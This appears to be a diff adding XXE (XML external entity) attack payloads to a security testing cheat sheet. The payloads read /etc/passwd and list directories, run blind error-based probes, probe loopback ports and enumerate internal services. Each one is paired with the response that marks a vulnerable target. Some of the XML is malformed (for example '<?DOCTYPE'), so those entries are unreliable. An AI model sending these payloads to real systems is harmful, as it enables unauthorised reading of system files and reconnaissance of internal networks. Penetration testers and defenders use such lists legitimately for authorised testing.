@@ -28,3 +28,54 @@ EXAMPLE TYPE-EMBEDDED MALICIOUS XML
 	<!ENTITY thisthing SYSTEM "file:///etc/passwd">
 ]>
 <something>passwd: %thisthing;</something>
+
+Directory listing payload
+<?xml version="1.0" encoding="utf-8"?>
+<?DOCTYPE title[
+	<!ELEMENT something ANY>
+	<!ENTITY % file SYSTEM "file:///">
+	<!ENTITY % ent "<!ENTITY data SYSTEM '%file;'>">
+]>
+<something>ls: %ent;</something>
+
+BLIND XXE (error-based)
+Test for filesystem access by requesting a non-existant file
+Request payload:
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "file:///etc/passwdxyz"> %ext;
+]>
+<r></r>
+Vulnerable Response:
+some variation of content is malformed or target file not accessible
+
+Check for activity on loopback interface sockets
+Request payload:
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://localhost:22/"> %ext;
+]>
+<r></r>
+Vulnerable Response:
+Invalid Http response error message
+
+Check for Protocol support
+Request payload:
+<?xml version="1.0" ?>
+<!DOCTYPE root [ <!ENTITY % ext SYSTEM "arbitrary://localhost/"> %ext; ]>
+<r></r>
+Vulnerable Response:
+unkown protocol error message
+
+Test communication with internal domain network traffic
+	-e.g. internal an jira or wiki service may return a non-error message and be routed to an external attacker
+Request payload:
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://enumeratedservice.target.dom/"> %ext;
+]>
+<r></r>
+Vulnerable Response:
+succesful access to http-hosted enumeratedservice or error for processing declarations
+	-in the later case read access is enumerated, but discovered service formatting cannot be processed
+		--unprocessed formats may included various markdown, non-html markup, compressed or git format files
